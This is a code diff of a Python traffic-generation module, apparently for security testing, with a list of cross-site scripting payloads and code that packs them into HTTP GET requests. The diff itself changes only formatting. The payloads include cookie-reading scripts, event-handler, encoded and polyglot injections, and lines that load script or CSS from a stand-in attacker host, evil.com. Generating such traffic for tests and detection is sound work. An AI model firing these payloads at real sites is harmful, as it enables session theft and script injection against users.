@@ -14,7 +14,6 @@ XSS_PAYLOADS = [
     "<script>alert(document.cookie)</script>",
     "<script>alert(String.fromCharCode(88,83,83))</script>",
     "<script src=http://evil.com/xss.js></script>",
-
     # Event handler injection
     "<img src=x onerror=alert('XSS')>",
     "<body onload=alert('XSS')>",
@@ -23,40 +22,32 @@ XSS_PAYLOADS = [
     "<marquee onstart=alert('XSS')>",
     "<video><source onerror=alert('XSS')>",
     "<details open ontoggle=alert('XSS')>",
-
     # JavaScript URL protocol
     "javascript:alert('XSS')",
     "javascript:alert(document.domain)",
     "<a href=javascript:alert('XSS')>click</a>",
     "<iframe src=javascript:alert('XSS')>",
-
     # Data URL
     "<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=>",
-
     # HTML injection
     "<div style=background:url(javascript:alert('XSS'))>",
     "<style>@import'http://evil.com/xss.css';</style>",
-
     # Encoded payloads
     "%3Cscript%3Ealert('XSS')%3C/script%3E",
     "&#60;script&#62;alert('XSS')&#60;/script&#62;",
     "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
-
     # DOM-based XSS
     "#<script>alert('XSS')</script>",
     "';alert('XSS');//",
     "\";alert('XSS');//",
-
     # Polyglot XSS
     "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
     "'-alert(1)-'",
-    "\"onclick=alert(1)//",
-
+    '"onclick=alert(1)//',
     # SVG-based XSS
     "<svg><script>alert('XSS')</script></svg>",
     "<svg/onload=alert('XSS')>",
     "<svg><animate onbegin=alert('XSS') attributeName=x>",
-
     # Template injection (potential XSS)
     "{{constructor.constructor('alert(1)')()}}",
     "${alert('XSS')}",
@@ -109,6 +100,7 @@ class XSSModule(TrafficModule):
 
         # URL encode the payload for GET request
         import urllib.parse
+
         encoded_payload = urllib.parse.quote(payload)
 
         # Create HTTP GET request with XSS in parameter
@@ -150,5 +142,3 @@ class XSSModule(TrafficModule):
         )
 
         yield packet
-
-
